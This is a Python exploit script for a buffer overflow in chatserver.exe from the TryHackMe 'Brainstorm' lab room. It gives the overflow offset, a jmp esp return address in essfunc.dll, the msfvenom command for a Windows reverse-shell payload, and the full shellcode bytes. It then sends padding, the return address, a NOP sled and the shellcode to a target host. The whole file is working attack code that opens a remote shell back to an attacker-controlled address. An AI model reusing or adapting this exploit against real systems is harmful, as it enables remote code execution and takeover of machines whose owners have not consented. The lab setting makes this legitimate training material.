
#Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in chatserver.exe (TryHackMe -> Brainstorm room)

import socket
import sys

# Offset: 2012
#  Message=  0x625014f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\MA LabMachine\Documents\WorkDesk\THM\brainstorm\essfunc.dll)


#Shellcode payload: msfvenom -p windows/shell_reverse_tcp LHOST=10.11.33.242 LPORT=4444 -b '\x00' -f python

buf =  b""
buf += b"\xda\xc8\xb8\xf7\xe9\x65\xb2\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x1c\x15\x87"
buf += b"\x47\x1e\x0e\xca\xa8\xde\xcf\xab\x21\x3b\xfe\xeb\x56"
buf += b"\x48\x51\xdc\x1d\x1c\x5e\x97\x70\xb4\xd5\xd5\x5c\xbb"
buf += b"\x5e\x53\xbb\xf2\x5f\xc8\xff\x95\xe3\x13\x2c\x75\xdd"
buf += b"\xdb\x21\x74\x1a\x01\xcb\x24\xf3\x4d\x7e\xd8\x70\x1b"
buf += b"\x43\x53\xca\x8d\xc3\x80\x9b\xac\xe2\x17\x97\xf6\x24"
buf += b"\x96\x74\x83\x6c\x80\x99\xae\x27\x3b\x69\x44\xb6\xed"
buf += b"\xa3\xa5\x15\xd0\x0b\x54\x67\x15\xab\x87\x12\x6f\xcf"
buf += b"\x3a\x25\xb4\xad\xe0\xa0\x2e\x15\x62\x12\x8a\xa7\xa7"
buf += b"\xc5\x59\xab\x0c\x81\x05\xa8\x93\x46\x3e\xd4\x18\x69"
buf += b"\x90\x5c\x5a\x4e\x34\x04\x38\xef\x6d\xe0\xef\x10\x6d"
buf += b"\x4b\x4f\xb5\xe6\x66\x84\xc4\xa5\xee\x69\xe5\x55\xef"
buf += b"\xe5\x7e\x26\xdd\xaa\xd4\xa0\x6d\x22\xf3\x37\x91\x19"
buf += b"\x43\xa7\x6c\xa2\xb4\xee\xaa\xf6\xe4\x98\x1b\x77\x6f"
buf += b"\x58\xa3\xa2\x20\x08\x0b\x1d\x81\xf8\xeb\xcd\x69\x12"
buf += b"\xe4\x32\x89\x1d\x2e\x5b\x20\xe4\xb9\x6e\xbe\xc7\xcb"
buf += b"\x07\xc2\x07\x3d\x84\x4b\xe1\x57\x24\x1a\xba\xcf\xdd"
buf += b"\x07\x30\x71\x21\x92\x3d\xb1\xa9\x11\xc2\x7c\x5a\x5f"
buf += b"\xd0\xe9\xaa\x2a\x8a\xbc\xb5\x80\xa2\x23\x27\x4f\x32"
buf += b"\x2d\x54\xd8\x65\x7a\xaa\x11\xe3\x96\x95\x8b\x11\x6b"
buf += b"\x43\xf3\x91\xb0\xb0\xfa\x18\x34\x8c\xd8\x0a\x80\x0d"
buf += b"\x65\x7e\x5c\x58\x33\x28\x1a\x32\xf5\x82\xf4\xe9\x5f"
buf += b"\x42\x80\xc1\x5f\x14\x8d\x0f\x16\xf8\x3c\xe6\x6f\x07"
buf += b"\xf0\x6e\x78\x70\xec\x0e\x87\xab\xb4\x3f\xc2\xf1\x9d"
buf += b"\xd7\x8b\x60\x9c\xb5\x2b\x5f\xe3\xc3\xaf\x55\x9c\x37"
buf += b"\xaf\x1c\x99\x7c\x77\xcd\xd3\xed\x12\xf1\x40\x0d\x37"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('10.10.70.180',9999))

print s.recv(1024)
s.send('yksa\r\n')
s.send('yksmsg\r\n')
print s.recv(1024)


malString = "A"*2012 + "\xf7\x14\x50\x62" +  "\x90" * 50 + buf
s.send(malString)
print s.recv(1024)
    
s.close
